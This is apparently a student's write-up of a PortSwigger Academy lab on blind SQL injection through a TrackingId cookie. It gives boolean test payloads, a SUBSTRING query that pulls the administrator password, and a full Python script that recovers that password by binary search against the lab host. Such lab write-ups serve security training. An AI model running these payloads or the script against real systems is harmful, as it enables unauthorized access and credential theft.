
#portswigger #solution #sqli

- **Category:** **SQL injection**
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-03

---

## 🎯 1. Lab Objective
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

---

## 🔍 2. Reconnaissance & Vulnerability Analysis

- When accessing the website first time, no "Welcome back!" greeting appears
 ![[Pasted image 20260803183613.png]]

- An cookie's been assigned named "TrackingId" in the response:
![[Pasted image 20260803183725.png]]

- After refreshing the website, we always see a "Welcome back!" greeting:
![[Pasted image 20260803183950.png]]
- The "TrackingId" appears in the request, which we can modify it and try using SQL injection.
- ![[Pasted image 20260803184048.png]]

 - First, I tried these two payloads:
 ```http
 GET / HTTP/2
Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND '1' = '1
 ```

``` http
GET / HTTP/2
Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND '1' = '2
```
As predicted, the results were different, which means we are now granted some access to the database. 
Reading the LAB's description, we know that :
"The database contains a different table called `users`, with columns called `username` and password."

 That means, we can take advantage of the "Welcome back!" greeting as a way to crack the password, using the following payload:
``` http
GET / HTTP/2
Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), *Char_index, 1) > '*character
```
-  Char_index: The current position of the targeting password
- character: The characters allowed in password

 We can easily get the character list by using python:
```bash
python3 -c "print('\n'.join(chr(i) for i in range(32, 127)))" > charset.txt
```
The problem is, we have absolutely no information about the length of the password, so my method is to use Burp Intruder with the length increases while comparing the current character > '!' symbol; till there is no "Welcome back!" appears.
![[Pasted image 20260803190646.png]]
![[Pasted image 20260803190718.png]]
Now I knows the password's length is 20.
I realize that we can use binary search algorithm to guess the password. Finally, I have my final payload down below:

---

## ⚡ 3. PoC / Final Payload


```python
import requests

cookies = {
    'TrackingId': "Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'a",
    'session': 'i7Axt75lKoLLNStQa7dzlgLBu0vfRtbj',
}

headers = {
    'Host': '0aa600f0033dedfb81a08ac600f200b4.web-security-academy.net',
    'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i',
    # 'Cookie': "TrackingId=Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'o; session=i7Axt75lKoLLNStQa7dzlgLBu0vfRtbj",
}

with open("char.txt", "r") as f:
    char_list = list(map(str.strip, f.readlines()))

left = 0
right = len(char_list) - 1

ans = ""

for i in range(1, 21):
    left = 0
    right = len(char_list) - 1
    while right > left:
        mid = (left + right)//2
        cookies['TrackingId'] = f"Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) > '{char_list[mid]}"
        response = requests.get(
            'https://0aa600f0033dedfb81a08ac600f200b4.web-security-academy.net/',
            cookies=cookies,
            headers=headers,
        )
        #true:
        if "Welcome" in response.text:
            left = mid+1
        #false
        else:
            right = mid
    ans+= char_list[left]

print("MAT KHAU CUA THANG ADMIN LA: ", ans)
```

A better practice is that I could use ThreadPoolExecutor to have better performance
